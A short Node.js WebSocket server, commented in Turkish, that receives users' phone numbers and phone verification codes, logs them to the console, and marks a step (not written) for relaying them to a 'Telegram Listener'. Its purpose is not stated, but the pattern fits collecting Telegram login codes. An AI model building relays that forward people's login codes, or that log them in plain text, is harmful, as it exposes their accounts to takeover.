const WebSocket = require("ws");

const wss = new WebSocket.Server({ port: process.env.PORT || 8765 });

wss.on("connection", function connection(ws) {
  console.log("WebSocket bağlantısı kuruldu.");

  ws.on("message", function incoming(message) {
    const data = JSON.parse(message);

    if (data.action === "send_phone") {
      console.log("Telefon numarası alındı:", data.phone);
      // Telegram Listener'a telefon numarasını ilet
      // (Bu kısımda Telegram Listener ile iletişim kurulacak)
    }

    if (data.action === "send_code") {
      console.log("Telefon kodu alındı:", data.code);
      // Telegram Listener'a kodu ilet
      // (Bu kısımda Telegram Listener ile iletişim kurulacak)
    }
  });
});

console.log("WebSocket sunucusu 8765 portunda çalışıyor.");